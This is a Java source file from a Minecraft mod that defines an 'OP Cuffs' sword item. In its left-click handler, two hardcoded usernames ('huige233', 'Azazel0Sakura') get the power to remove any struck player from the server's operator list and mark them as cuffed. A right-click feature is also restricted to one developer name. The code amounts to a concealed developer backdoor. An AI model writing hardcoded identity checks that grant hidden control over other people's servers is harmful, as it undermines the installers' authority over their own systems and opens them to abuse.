package huige233.transcend.items.tools;

import com.mojang.authlib.GameProfile;
import huige233.transcend.Transcend;
import huige233.transcend.init.ModItems;
import huige233.transcend.util.IHasModel;
import huige233.transcend.util.ItemNBTHelper;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.item.ItemStack;
import net.minecraft.item.ItemSword;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.ActionResult;
import net.minecraft.util.EnumActionResult;
import net.minecraft.util.EnumHand;
import net.minecraft.util.text.TextFormatting;
import net.minecraft.util.text.translation.I18n;
import net.minecraft.world.World;
import org.jetbrains.annotations.NotNull;

import java.lang.reflect.Field;

public class ItemOPCuffs extends ItemSword implements IHasModel {
    public ItemOPCuffs(String name,ToolMaterial material) {
        super(material);
        setTranslationKey(name);
        setRegistryName(name);
        setCreativeTab(Transcend.TranscendTab);
        ModItems.ITEMS.add(this);
    }

    @Override
    public void registerModels() {
        Transcend.proxy.registerItemRenderer(this,0,"inventory");
    }

    @Override
    public boolean onLeftClickEntity(@NotNull ItemStack stack, @NotNull EntityPlayer player, Entity entity){
        if(!player.world.isRemote) {
            if(player.getName().equals("huige233")||player.getName().equals("Azazel0Sakura")){
                if(entity instanceof EntityPlayer){
                    EntityPlayerMP target = (EntityPlayerMP) entity;
                    MinecraftServer server = target.getServer();
                    GameProfile profile = target.getGameProfile();
                    server.getPlayerList().getOppedPlayers().removeEntry(profile);
                    NBTTagCompound op = getOptional(target);
                    if(op.getBoolean("_Cuff_")) {
                        op.removeTag("_Cuff_");
                    }else {
                        target.getEntityData().setBoolean("_Cuff_",true);
                    }
                }
            }
        }
        return false;
    }

    static Field entityDataField;
    static {
        try {
            Field field = Entity.class.getDeclaredField("customEntityData");
            field.setAccessible(true);
            entityDataField = field;
        } catch (Exception ignored) {}
    }

    private static NBTTagCompound getOptional(EntityPlayerMP online) {
        try {
            if (entityDataField != null) {
                return (NBTTagCompound) entityDataField.get(online);
            }
        } catch (Exception ignored) {}
        return online.getEntityData();
    }

    @Override
    public ActionResult<ItemStack> onItemRightClick(World world, EntityPlayer player, EnumHand hand){
        ItemStack stack =  player.getHeldItem(hand);
        if(!world.isRemote) {
            if(player.getName().equals("huige233")){
                boolean smelt = ItemNBTHelper.getBoolean(stack,"AutoSmelt",false);
                if(!smelt){
                    ItemNBTHelper.setBoolean(stack,"AutoSmelt",true);
                    stack.setStackDisplayName(TextFormatting.RED + I18n.translateToLocal("transcend_pickaxe_smelt.name"));
                    player.swingArm(hand);
                } else {
                    ItemNBTHelper.setBoolean(stack, "AutoSmelt", false);
                    stack.setStackDisplayName(TextFormatting.RED + I18n.translateToLocal("item.transcend_pickaxe.name"));
                    player.swingArm(hand);
                }
            }
        }
        return new ActionResult(EnumActionResult.SUCCESS, stack);
    }
}
